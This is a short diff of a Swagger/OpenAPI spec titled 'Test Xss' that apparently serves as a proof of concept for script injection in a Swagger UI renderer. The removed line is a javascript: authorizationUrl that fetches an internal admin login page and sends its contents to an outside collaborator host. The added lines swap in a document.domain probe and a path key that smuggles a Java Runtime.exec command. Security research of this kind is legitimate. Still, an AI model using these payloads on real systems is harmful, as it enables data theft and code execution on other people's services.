@@ -2,13 +2,13 @@ swagger: '2.0'
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: javascript:fetch('https://mymessage-corp.apple.com/mmservices/admin/login').then(a=> a.text()).then(a=> fetch('https://0opz7ocez74upehubhydrq13ouuki9.oastify.com?x='+a))//
+    authorizationUrl: javascript:console.log(document.domain)//
 info:
   version: "0.0.1"
   title: Test Xss
   description: Please Autorize!
-paths:
-  /:
+paths: {          
+     /a; try{java.lang.Runtime.getRuntime().exec(\"ls\");}catch(Exception e){} \"":   
     get:
       responses:
         200:
